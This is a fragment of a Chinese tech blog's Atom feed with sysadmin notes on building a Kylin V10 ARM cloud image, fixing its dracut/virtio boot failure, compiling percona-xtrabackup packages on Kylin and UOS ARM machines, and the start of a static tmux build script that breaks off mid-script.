        <updated>2021-12-16T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[* Kramdown table of contents]]></summary>
        <content type="html"><![CDATA[<ul><li>Kramdown table of contents
{:toc .toc}</li></ul><blockquote><p>背景：云上没有kylin的arm镜像,需要自己做一个</p></blockquote><h2 class="anchor anchorWithStickyNavbar_LWe7" id="1-准备">1 准备<a class="hash-link" href="#1-准备" title="标题的直接链接">​</a></h2><p>iso: Kylin-Server-10-SP2-aarch64-Release-Build09-20210524.iso</p><p>一台arm的cvm, 一块数据盘</p><p>scp  Kylin-Server-10-SP2-aarch64-Release-Build09-20210524.iso  x.x.x.x:/kylin.iso</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-配置grub">2 配置grub<a class="hash-link" href="#2-配置grub" title="标题的直接链接">​</a></h2><p>修改grub配置增加从iso引导的入口，重启机器时从iso引导进入安装流程</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># cat /etc/grub.d/40_custom</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exec tail -n +3 $0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># This file provides an easy way to add custom menu entries.  Simply type the</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># menu entries you want to add after this comment.  Be careful not to change</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># the 'exec tail' line above.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">menuentry 'Install Kylin Linux Advanced Server V10' --class red --class gnu-linux --class gnu --class os {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set isolabel="Kylin-Server-10"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    set isofile="/kylin.iso"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    insmod iso9660</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    loopback loop $isofile</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    linux (loop)/images/pxeboot/vmlinuz inst.stage2=hd:LABEL=Kylin-Server-10 ro iso-scan/filename=$isofile console=tty0 video=efifb:off video=VGA-1:640x480-32@60me</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    initrd (loop)/images/pxeboot/initrd.img</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上面的参数从哪获取来？
1 </p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mount /kylin.iso /mnt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">find /mnt -name grub.cfg</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>找到的内容作为linux行的参考</p><p>2</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">blkid /kylin.iso</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>可以获得isolabel信息</p><p>下一步</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">vi /etc/default/grub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#修改GRUB_TIMEOUT=60 增加timeout方便web vnc登录操作</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grub2-mkconfig --ouput=/boot/grub2/grub.cfg</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sync</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reboot</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-开始装系统">3 开始装系统<a class="hash-link" href="#3-开始装系统" title="标题的直接链接">​</a></h2><p>系统会安装到数据盘，因为系统盘被iso占用，mount状态无法使用，必须有独立的数据盘用来装系统
注意安装cloud-init包。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="4-制作云镜像">4 制作云镜像<a class="hash-link" href="#4-制作云镜像" title="标题的直接链接">​</a></h2><p>重启回到原先的系统</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yum -y install qemu-img</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qemu-img convert -f raw -O qcow2 /dev/vdb /kylin.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="5-镜像创建cvm后启动失败问题一例">5 镜像创建CVM后启动失败问题一例<a class="hash-link" href="#5-镜像创建cvm后启动失败问题一例" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="报错信息如下">报错信息如下：<a class="hash-link" href="#报错信息如下" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/dev/disk/by-uuid/bed44859-b637-4490-b7f9-f62f952f6hfa Warning:does not exist</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Generating "/run/initramfs/rdsosreport.txt"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Entering emergency mode. Exit the shell to continue."journalctl" to view system logs.TypeYou might want to save "/run/initramfs/rdsosreport.txt" to a USB stick or /bootaftermounting them and attach it to a bug report.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="原因分析">原因分析：<a class="hash-link" href="#原因分析" title="标题的直接链接">​</a></h3><h5 class="anchor anchorWithStickyNavbar_LWe7" id="1virtio驱动安装的不准确或者异常">1.virtio驱动安装的不准确或者异常<a class="hash-link" href="#1virtio驱动安装的不准确或者异常" title="标题的直接链接">​</a></h5><h5 class="anchor anchorWithStickyNavbar_LWe7" id="2内核缺陷本身导致">2.内核缺陷本身导致<a class="hash-link" href="#2内核缺陷本身导致" title="标题的直接链接">​</a></h5><h3 class="anchor anchorWithStickyNavbar_LWe7" id="解决方法">解决方法：<a class="hash-link" href="#解决方法" title="标题的直接链接">​</a></h3><h5 class="anchor anchorWithStickyNavbar_LWe7" id="1virtio驱动的修复">1.Virtio驱动的修复<a class="hash-link" href="#1virtio驱动的修复" title="标题的直接链接">​</a></h5><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">查询</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">grep -i virtio /boot/config-$(uname -r)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">是否包含在临时文件系统</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lsinitrd /boot/initramfs-$(uname -r).img | grep virtio</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">修复临时文件系统</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vim /etc/dracut.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">add_drivers+="virtio_blk virtio_scsi virtio_net virtio_pci virtio_ring virtio"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dracut -f</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h5 class="anchor anchorWithStickyNavbar_LWe7" id="2内核缺陷规避">2.内核缺陷规避<a class="hash-link" href="#2内核缺陷规避" title="标题的直接链接">​</a></h5><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo 'add_drivers+="xen-netfront xen-blkfront "' &gt; /etc/dracut.conf.d/xen.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">KERNEL_VERSION=$(rpm -q kernel --qf '%{V}-%{R}.%{arch}\n'|head -n1)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dracut -f /boot/initramfs-$KERNEL_VERSION.img $KERNEL_VERSION</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <category label="kylin" term="kylin"/>
        <category label="cvm" term="cvm"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[银河麒麟v10 aarch64机器构建percona-xtrabackup-80 rpm包]]></title>
        <id>/2021/07/21/kylin-v10-aarch64-build-percona-xtrabackup-80-rpm</id>
        <link href="https://itxx00.github.io/notes/blog/2021/07/21/kylin-v10-aarch64-build-percona-xtrabackup-80-rpm"/>
        <updated>2021-07-21T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[如何自己构建aarch64 xtrabackup rpm]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="1-环境准备">1 环境准备<a class="hash-link" href="#1-环境准备" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">yum install cmake3 openssl-devel libaio libaio-devel automake autoconf bison libtool ncurses-devel \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    libgcrypt-devel libev-devel libcurl-devel zlib-devel vim-common readline-devel python-sphinx rpm-build</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-获取最新srpm包">2 获取最新SRPM包<a class="hash-link" href="#2-获取最新srpm包" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 查看需要下载的版本</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">https://repo.percona.com/yum/release/8/SRPMS/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#如：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wget https://repo.percona.com/yum/release/8/SRPMS/percona-xtrabackup-80-8.0.25-17.1.generic.src.rpm</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-build-rpm">3 BUILD RPM<a class="hash-link" href="#3-build-rpm" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rpm -ivh percona-xtrabackup-80-8.0.25-17.1.generic.src.rpm</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd ~/rpmbuild</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rpmbuild -bb --nodebuginfo SPECS/percona-xtrabackup.spec</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="over">OVER<a class="hash-link" href="#over" title="标题的直接链接">​</a></h2>]]></content>
        <category label="bash" term="bash"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[UOS arm64机器build percona-xtrabackup-80 deb包]]></title>
        <id>/2021/07/21/uos-arm64-build-percona-xtrabackup-80</id>
        <link href="https://itxx00.github.io/notes/blog/2021/07/21/uos-arm64-build-percona-xtrabackup-80"/>
        <updated>2021-07-21T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[uos如何快速构建xtrabackup deb]]></summary>
        <content type="html"><![CDATA[<ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="1-系统环境">1 系统环境<a class="hash-link" href="#1-系统环境" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@VM-0-14-linux:~# cat /etc/os-release</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PRETTY_NAME="uos 20"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NAME="uos"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VERSION_ID="20"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">VERSION="20"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ID=uos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HOME_URL="https://www.chinauos.com/"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BUG_REPORT_URL="http://bbs.chinauos.com"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root@VM-0-14-linux:~# uname -a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Linux VM-0-14-linux 4.19.0-arm64-server #1635 SMP Mon Jan 13 16:07:12 CST 2020 aarch64 GNU/Linux</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root@VM-0-14-linux:~# cat /etc/debian_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">10.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">root@VM-0-14-linux:~#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-配置perconca官方apt源">2 配置perconca官方apt源<a class="hash-link" href="#2-配置perconca官方apt源" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget https://repo.percona.com/apt/percona-release_latest.buster_all.deb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dpkg -i percona-release_latest.buster_all.deb</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 修改脚本中两个变量</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vi /usr/bin/percona-release</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CODENAME=buster</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OS_VER=buster</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 开启perconca源</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">percona-release enable-only tools release</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-build">3 BUILD<a class="hash-link" href="#3-build" title="标题的直接链接">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 安装依赖</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">apt-get build-dep percona-xtrabackup-80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 构建</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">apt-get source --compile percona-xtrabackup-80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="over">OVER<a class="hash-link" href="#over" title="标题的直接链接">​</a></h2>]]></content>
        <category label="bash" term="bash"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[how to build a static tmux bin]]></title>
        <id>/2021/06/30/build-tmux-static</id>
        <link href="https://itxx00.github.io/notes/blog/2021/06/30/build-tmux-static"/>
        <updated>2021-06-30T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[* Kramdown table of contents]]></summary>
        <content type="html"><![CDATA[<ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>build-tmux-static.sh</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TARGETDIR=$1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">if [ "$TARGETDIR" = "" ]; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">TARGETDIR=$(python -c 'import os; print os.path.realpath("local")')</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mkdir -p $TARGETDIR</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">libevent() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  curl -LO https://github.com/libevent/libevent/releases/download/release-2.0.22-stable/libevent-2.0.22-stable.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  tar -zxvf libevent-2.0.22-stable.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cd libevent-2.0.22-stable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ./configure --prefix=$TARGETDIR &amp;&amp; make &amp;&amp; make install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cd ..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ncurses() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  curl -LO https://ftp.gnu.org/pub/gnu/ncurses/ncurses-6.0.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  tar zxvf ncurses-6.0.tar.gz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cd ncurses-6.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ./configure --with-termlib --prefix $TARGETDIR \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              --with-default-terminfo-dir=/usr/share/terminfo \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              --with-terminfo-dirs="/etc/terminfo:/lib/terminfo:/usr/share/terminfo" \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              --enable-pc-files \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              --with-pkg-config-libdir=$TARGETDIR/lib/pkgconfig \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &amp;&amp; make &amp;&amp; make install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cd ..</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token 